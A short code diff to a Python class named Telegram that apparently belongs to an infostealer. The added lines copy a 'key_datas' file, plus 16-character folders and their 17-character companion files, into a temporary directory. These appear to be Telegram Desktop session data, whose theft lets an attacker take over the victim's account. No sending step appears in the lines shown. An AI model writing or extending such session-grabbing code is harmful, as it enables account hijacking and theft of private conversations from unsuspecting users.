@@ -15,7 +15,9 @@ class Telegram:
                 temp = tempfile.mkdtemp()
                 for i in os.listdir(x):
                     abs_src = os.path.abspath(os.path.join(x, i))
-                    if os.path.isdir(abs_src) and len(i) == 16:
+                    if os.path.isfile(abs_src) and i.lower() == 'key_datas':
+                        shutil.copy(os.path.join(x, i), temp)
+                    elif os.path.isdir(abs_src) and len(i) == 16:
                         for ii in os.listdir(x):
                             if os.path.isfile(os.path.join(x, ii)) and ii.startswith(i) and len(ii) == 17:
                                 shutil.copy(os.path.join(x, ii), temp)
